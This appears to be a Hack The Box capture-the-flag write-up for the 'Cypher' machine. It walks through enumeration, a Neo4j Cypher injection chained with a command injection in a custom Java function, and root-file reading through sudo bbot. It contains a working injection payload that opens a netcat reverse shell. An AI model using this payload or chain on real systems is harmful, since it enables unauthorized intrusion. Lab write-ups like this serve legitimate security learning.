@@ -1,0 +1,154 @@
+---
+title: Cypher
+date: '2025-03-02'
+description: ''
+type: writeup
+platform: hackthebox
+tags:
+  - ACTIVE MACHINE
+  - INJECTION
+  - LINUX
+  - MEDIUM
+cover: /mc/uploads/2025/03/cypher.webp
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+In this walkthrough, we'll explore the steps to compromise the Cypher machine on Hack The Box. We'll cover enumeration, vulnerability discovery,exploitation, and privilege escalation. Let's dive in!
+
+## Enumerate Nmap 
+
+Every great heist begins with reconnaissance, and ours is no exception. We kick things off by unleashing **Nmap**, we scan the Cypher machine to uncover its secrets. The results roll in like a message from the digital gods:
+
+```bash
+nmap -sV 10.10.11.57 -T5 -O
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 16:35 +00
+Nmap scan report for cypher.htb (10.10.11.57)
+Host is up (0.056s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5.0
+OS details: Linux 5.0
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+Only two ports greet us: **port 22 (SSH)** and **port 80 (HTTP)**, but these are our gateways to **glory**. Port 22 hints at a secure shell we might crack later, while port 80 promises a web server ripe for mischief. Let’s zoom in on that HTTP port and see what treasures await!
+
+## Directory Discovery
+
+Next up, I unleashed **Gobuster**, the web’s nosiest detective, to hunt for hidden paths:
+
+```bash
+gobuster dir -u http://cypher.htb -w ~/SecLists/Discovery/Web-Content/common.txt                                                   
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://cypher.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/kali/SecLists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/about                (Status: 200) [Size: 4986]
+/api                  (Status: 307) [Size: 0] [--> /api/docs]
+/demo                 (Status: 307) [Size: 0] [--> /login]
+/index                (Status: 200) [Size: 4562]
+/index.html           (Status: 200) [Size: 4562]
+/login                (Status: 200) [Size: 3671]
+/testing              (Status: 301) [Size: 178] [--> http://cypher.htb/testing/]
+```
+### Vulnerability Discovery
+
+**/testing** waved a red flag—a directory with a .jar file just begging to be cracked open. It’s our golden ticket.
+
+A .jar file is Java’s version of a treasure chest. I popped it open with an online decompiler and found this gem in **CustomFunctions.java**:
+
+```bash
+String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
+      System.out.println("Command: " + Arrays.toString(command));
+      Process process = Runtime.getRuntime().exec(command);
+```
+Whoa! This code takes a user-supplied url and jams it straight into a shell command without batting an eye. No sanitization, no checks—just pure, exploitable chaos. This is our backdoor, folks. We can inject our own commands . But wait, there’s more! While poking the /login endpoint, an error :
+
+```bash
+neo4j.exceptions.CypherSyntaxError: ... "MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash"
+```
+[![](https://nutzh.top/wp-content/uploads/2025/03/Screenshot-2025-03-03-183213-1024x319.png)](https://nutzh.top/wp-content/uploads/2025/03/Screenshot-2025-03-03-183213.png)A **Cypher injection** vulnerability tied to a Neo4j database? The machine’s name suddenly makes sense. We’re juggling two weaknesses now—a command injection in the .jar and a Cypher injection in the login. Time to forge our master key!
+
+## Exploitation
+
+With our vulnerabilities locked and loaded, we turn to **Burp Suite**, to craft a killer payload. After countless tweaks, we land on this beauty:
+
+```bash
+{"username":"admin' OR 1=1 WITH 1 as dummy CALL custom.getUrlStatusCode('example.com; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $ip $port > /tmp/f') YIELD statusCode RETURN statusCode as hash //",
+"password":"asdsadas"}
+```
+Here’s the play-by-play:
+
+- The admin' OR 1=1 tricks the Cypher query into bypassing authentication.
+- The CALL custom.getUrlStatusCode() exploits the .jar vulnerability, injecting a reverse shell command.
+- The shell pipes back to our listener at $ip $port via nc.
+
+We fire up a Netcat listener , send the payload, and—BOOM!—a shell pops:
+
+```bash
+$ nc -nvlp 4444
+bash: cannot set terminal process group (1446): Inappropriate ioctl for device
+bash: no job control in this shell
+neo4j@cypher:/$
+```
+## Privilege Escalation
+
+Now inside, we snoop around and stumble upon a .yml file in /home/graphasm:
+
+```bash
+config:
+  modules:
+    neo4j:
+      username: neo4j
+      password: cU4btyib.XXXXX
+```
+A password! We test it with  **graphasm**, and it works like a charm. After spawning a proper shell with python3 , we’re now graphasm@cypher.
+
+```bash
+$ su graphasm
+# password : cU4btyib.XXXXX
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+graphasm@cypher:~$
+```
+Next, we check our privileges :
+
+```bash
+graphasm@cypher:~$ sudo -l
+Matching Defaults entries for graphasm on cypher:
+    env_reset, mail_badpass,
+
+    User graphasm may run the following commands on cypher:
+    (ALL) NOPASSWD: /usr/local/bin/bbot
+```
+We can run bbot as root without a password? That’s our escalator to the top! Time to dig into the bbot manual and find the perfect exploit.
+
+## The Final Exploit
+
+After trial and error with bbot options, we craft the winning command:
+
+```bash
+graphasm@cypher:~$ sudo /usr/local/bin/bbot --custom-yara-rules /root/root.txt --debug
+```
+[![](https://nutzh.top/wp-content/uploads/2025/03/Screenshot-2025-03-02-182340-1.png)](https://nutzh.top/wp-content/uploads/2025/03/Screenshot-2025-03-02-182340-1.png)SUMMARY:
+
+- How to spot and exploit unsanitized shell commands.
+- The art of Cypher injection with Neo4j.
+- The power of **bbot** as an unwitting ally.
+
+Big thanks to the creator for this brain-teasing challenge. It’s been a blast, and now we can kick back—until the next machine calls. Keep hacking, keep learning, and see you on the leaderboard!
